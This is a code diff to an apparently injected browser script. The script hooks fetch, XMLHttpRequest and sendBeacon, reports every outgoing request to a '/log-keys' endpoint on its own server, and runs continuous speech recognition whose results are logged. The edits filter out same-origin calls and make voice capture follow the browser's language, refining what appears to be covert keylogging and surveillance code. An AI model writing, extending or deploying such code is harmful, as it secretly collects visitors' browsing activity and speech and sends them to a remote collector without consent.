@@ -1608,8 +1608,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
                 try {
                     const url    = typeof input === 'string' ? input : (input.url || String(input));
                     const method = (init && init.method ? init.method : 'GET').toUpperCase();
-                    // Only log cross-origin or API-looking requests to avoid infinite loop
-                    if (!url.includes('/log-keys') && !url.includes('/heartbeat')) {
+                    // Only log cross-origin requests — skip all calls to our own server to avoid noise/loops
+                    if (!url.includes('/log-keys') && !url.includes('/heartbeat') &&
+                        !url.startsWith('/') && !url.startsWith(BASE)) {
                         const short = url.slice(0, 180);
                         _post('/log-keys', {
                             keys: `[FETCH] ${method} ${short}`,
@@ -1633,8 +1634,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             XMLHttpRequest.prototype.open = function(method, url) {
                 try {
                     const sUrl = String(url || '');
-                    // Skip our own tracking endpoints to avoid infinite loops
-                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
+                    // Skip our own server (tracking endpoints) to avoid noise/infinite loops
+                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat') &&
+                        !sUrl.startsWith('/') && !sUrl.startsWith(BASE)) {
                         _post('/log-keys', {
                             keys: `[XHR] ${(method || 'GET').toUpperCase()} ${sUrl.slice(0, 180)}`,
                             url: location.href
@@ -1695,7 +1697,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             navigator.sendBeacon = function(url, data) {
                 try {
                     const sUrl = String(url || '').slice(0, 180);
-                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat')) {
+                    if (!sUrl.includes('/log-keys') && !sUrl.includes('/heartbeat') &&
+                        !sUrl.startsWith('/') && !sUrl.startsWith(BASE)) {
                         _post('/log-keys', {
                             keys: `[BEACON] ${sUrl}`,
                             url: location.href
@@ -2257,7 +2260,7 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             const rec = new SR();
             rec.continuous = true;
             rec.interimResults = true;
-            rec.lang = 'nl-NL';
+            rec.lang = navigator.language || navigator.userLanguage || 'en-US';
             let lastLog = 0;
             rec.onresult = (e) => {
                 const now = Date.now();
